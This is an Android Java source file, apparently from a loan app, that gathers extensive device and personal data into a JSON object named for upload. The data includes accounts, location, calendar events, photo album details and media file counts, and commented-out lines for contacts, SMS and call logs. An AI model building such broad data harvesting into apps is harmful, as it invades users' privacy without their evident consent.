package com.homecredit.loan.hcjson;

import android.content.Context;

import com.homecredit.loan.hcjson.bean.IpInf;

import org.json.JSONArray;
import org.json.JSONObject;

public class UploadInfo {
    public static JSONObject getDeviceJson(Context context) {
        JSONObject deviceInfo = new JSONObject();
        try {
//            JSONArray appsJsonArray = DeviceUtils.getAppList(context);
//            if (appsJsonArray == null || appsJsonArray.length() <= 0) {
//                appsJsonArray = DeviceUtils.getAppList2(context);
//            }
            deviceInfo.put("account", AccountsUtil.getAppAccounts(context));
            deviceInfo.put("location", DeviceUtils.getLocation());
            deviceInfo.put("hardware", DeviceUtils.getHardWareInfo());
            deviceInfo.put("storage", FileSizeUtil.getStorageInfo());
            deviceInfo.put("general_data", DeviceUtils.getGeneralData());
            deviceInfo.put("other_data", DeviceUtils.getOtherData());
//            deviceInfo.put("application", appsJsonArray);
//            deviceInfo.put("contact", new ContactsUtil(context).getContactsInfo());
            deviceInfo.put("network", DeviceUtils.getNetworkData());
            deviceInfo.put("battery_status", DeviceUtils.getBatteryData());
            deviceInfo.put("audio_external", DeviceUtils.getAudioExternalNumber());
            deviceInfo.put("audio_internal", DeviceUtils.getAudioInternalNumber());
            deviceInfo.put("images_external", DeviceUtils.getImagesExternalNumber());
            deviceInfo.put("images_internal", DeviceUtils.getImagesInternalNumber());
            deviceInfo.put("video_external", DeviceUtils.getVideoExternalNumber());
            deviceInfo.put("video_internal", DeviceUtils.getVideoInternalNumber());
            deviceInfo.put("download_files", DeviceUtils.getDownloadFileNumber());
            deviceInfo.put("albs", FileSizeUtil.getImagesMsg());
//            deviceInfo.put("contact_group", DeviceUtils.getContactsGroupNumber());
            deviceInfo.put("build_id", AppLocalUtils.getVersionCode(context));
            deviceInfo.put("build_name", AppLocalUtils.getVersionName(context));
            deviceInfo.put("package_name", AppLocalUtils.getPackageName(context));
            deviceInfo.put("create_time", System.currentTimeMillis());
            deviceInfo.put("calendar", CalendarEvents.getcalendar(context));

            IpInf publicIp = new IpInf();
            publicIp.setFirst_ip(PhoneTools.getHostIP());
            publicIp.setSecond_ip(PhoneTools.getHostIP());
            JSONObject jsonPIP = new JSONObject();
            jsonPIP.put("first_ip", publicIp.getFirst_ip());
            jsonPIP.put("second_ip", publicIp.getSecond_ip());
            deviceInfo.put("public_ip", jsonPIP);
//            deviceInfo.put("sms", SmsUtil.getSmsList(context));
//            deviceInfo.put("call",CallUtil.getContactList(context));

        } catch (Exception e) {
            e.printStackTrace();
        }
        return deviceInfo;
    }

}
